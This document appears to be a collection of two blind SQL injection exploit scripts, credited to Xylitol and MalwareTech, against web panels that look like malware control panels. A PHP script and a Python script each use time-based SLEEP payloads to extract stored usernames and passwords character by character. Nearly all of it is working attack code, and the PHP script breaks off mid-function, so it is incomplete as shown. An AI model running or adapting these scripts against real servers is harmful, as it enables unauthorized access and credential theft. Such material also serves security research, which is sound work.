

Type: Blind SQL injection vulnerability

Author: [Xylitol](https://twitter.com/Xylit0l)

```
<?php
	// Start with PHP CLI (php pwn.php)
	set_time_limit(0);

	// Adjust this :)
	define('SLEEP_TIME', '4');
	define('PAGE_TIME',  4);
	define('URL',        'http://localhost/Phase/');

	echo('attacking ' . URL . PHP_EOL);

	get_string('username');
	get_string('password');

	function get_length($field) {
		$length = 1;

		while (!is_true("' UNION SELECT ALL 1,2,3,4,5,6,7 FROM `settings` WHERE `key` = '" . $field . "' AND (NOT (LENGTH(value)=" . $length . ") OR SLEEP(" . SLEEP_TIME . "))-- ")) {
			++$length;
		}

		echo($field . ' length: ' . $length . PHP_EOL);

		return $length;
	}

	function get_string($field) {
		$length = get_length($field);
		$str    = '';

		for ($i = 0; $i < $length; ++$i) {
			$str .= chr(get_char($field, $i));
			echo($field . ' : ' . str_pad($str, $length, '*') . PHP_EOL);
		}

		return $str;
	}

	function get_char($field, $id) {
		$binary = '';

		for ($i = 1; $i < 256; $i *= 2) {
			if ($i == 128)
				$binary = '0' . $binary;
			else
				$binary = (is_true("' UNION SELECT ALL 1,2,3,4,5,6,7 FROM `settings` WHERE `key` = '" . $field . "' AND (NOT (ORD(SUBSTR(`value`," . ($id + 1) . ",1)) & " . $i . ") OR SLEEP(" . SLEEP_TIME . "))-- ") ? '1' : '0') . $binary;



```

Type: Blind SQL injection vulnerability

Author: [Malwaretech](https://twitter.com/MalwareTechBlog)

```
import requests
import time
import sys
 
wait_delay = 5 #Depending on connection delay and server speed, you may need to make this a larger number
KnockString = 'g=a&w=a&b=a&d=a&p=a&m=a' #lol no integrity verification
 
PostData = ""
 
def rc4_crypt(data , key):
		S = list(range(256))
		j = 0
		out = []
 
		for i in range(256):
				j = (j + S[i] + ord( key[i % len(key)] )) % 256
				S[i] , S[j] = S[j] , S[i]
 
		i = j = 0
		for char in data:
				i = ( i + 1 ) % 256
				j = ( j + S[i] ) % 256
				S[i] , S[j] = S[j] , S[i]
				out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))    
		return ''.join(out)
 
def brute_length(url, id):
		for i in range(0, 30):
				Injection = "\"', (IF(LENGTH((SELECT value FROM settings WHERE id='%d')) = %d, SLEEP(%d), 0)), 'a', 'a', 'a', 'a', 'a', 'a')-- -" % (id, i, wait_delay)
				ConnectUrl  = url + '?i=' + Injection
 
				start = time.time()
				r = requests.post(ConnectUrl, data=PostData, headers='')
				end = time.time()
 
				if((end - start) >= wait_delay):
						return i
					   
		return 0
	   
def brute_char(url, position, id):
		sys.stdout.write(" ")
		sys.stdout.flush()
					   
		for i in range(32, 127):
				Injection = "\"', (IF(SUBSTRING((SELECT value FROM settings WHERE id='%d'), %d, 1) = BINARY CHAR(%d), SLEEP(%d), 0)), 'a', 'a', 'a', 'a', 'a', 'a')-- -" % (id, position, i, wait_delay)
				ConnectUrl  = url + '?i=' + Injection
			   
				sys.stdout.write("\b%c" % chr(i))
				sys.stdout.flush()
			   
				start = time.time()
				r = requests.post(ConnectUrl, data=PostData, headers='')
				end = time.time()
 
				if((end - start) >= wait_delay):
						break
 
def brute_panel(url):
		global KnockString, PostData
	   
		PostData = 'aaaa' + rc4_crypt(KnockString, 'aaaa')
	   
		print"Username: ",;
		sys.stdout.flush()
		ulen = brute_length(url, 1)
	   
		for i in range(1, ulen+1):
				brute_char(url, i, 1)
 
		print"\nPassword: ",
		sys.stdout.flush()
		plen = brute_length(url, 2)
	   
		for i in range(1, plen+1):
				brute_char(url, i, 2)
		print""
 
if(len(sys.argv) >= 2):
		brute_panel(sys.argv[1])
else:
		print("enter panel gate url")

```